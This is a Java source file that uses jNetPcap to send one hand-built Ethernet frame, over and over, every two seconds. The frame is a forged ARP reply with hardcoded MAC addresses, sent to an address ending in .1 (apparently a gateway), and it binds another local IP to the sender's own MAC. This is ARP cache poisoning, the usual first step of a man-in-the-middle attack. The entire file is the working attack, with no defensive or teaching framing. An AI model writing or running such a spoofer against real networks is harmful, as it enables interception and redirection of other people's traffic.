package com.company;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JMemoryPacket;
import org.jnetpcap.packet.JPacket;
import org.jnetpcap.protocol.JProtocol;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;

public class Main {
    static String destMAC="c83dd48810d5";
    public static String dataToSend="6ec7ec77b019"+destMAC+"08060001080006040002"+destMAC+""+"c0a82bcf"+"6ec7ec77b019c0a82b01";

    public static void main(String[] args) throws InterruptedException {
        List<PcapIf> alldevs = new ArrayList<PcapIf>(); // Will be filled with NICs
        StringBuilder errbuf = new StringBuilder(); // For any error msgs
        int r = Pcap.findAllDevs(alldevs, errbuf);
        if (r != Pcap.OK || alldevs.isEmpty()) {
            System.err.printf("Can't read list of devices, error is %s",
                    errbuf.toString());
            return;
        }
        System.out.println("Network devices found:");
        int i = 0;
        for (PcapIf device : alldevs) {
            String description = (device.getDescription() != null) ? device
                    .getDescription() : "No description available";
            System.out.printf("#%d: %s [%s]\n", i++, device.getName(),
                    description);

        }
        PcapIf device = alldevs.get(5); // Get first device in list
        System.out.printf("\nChoosing '%s' on your behalf:\n",
                (device.getDescription() != null) ? device.getDescription()
                        : device.getName());
        int snaplen = 64 * 1024; // Capture all packets, no trucation
        int flags = Pcap.MODE_PROMISCUOUS; // capture all packets
        int timeout = 10 * 1000; // 10 seconds in millis
        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
        if (pcap == null) {
            System.err.printf("Error while opening device for capture: "
                    + errbuf.toString());
            return;
        }
        pcap.close();

        while (true) {
            pcap=Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);
            SendPacket(pcap,dataToSend);
            pcap.close();
            Thread.sleep(2000);

        }
    }
    private static void SendPacket(Pcap pcap,String ARP_data) {
        JPacket jp = new JMemoryPacket(JProtocol.ARP_ID, ARP_data);
        pcap.sendPacket(ByteBuffer.wrap(jp.getByteArray(0, jp.size())));
    }
}
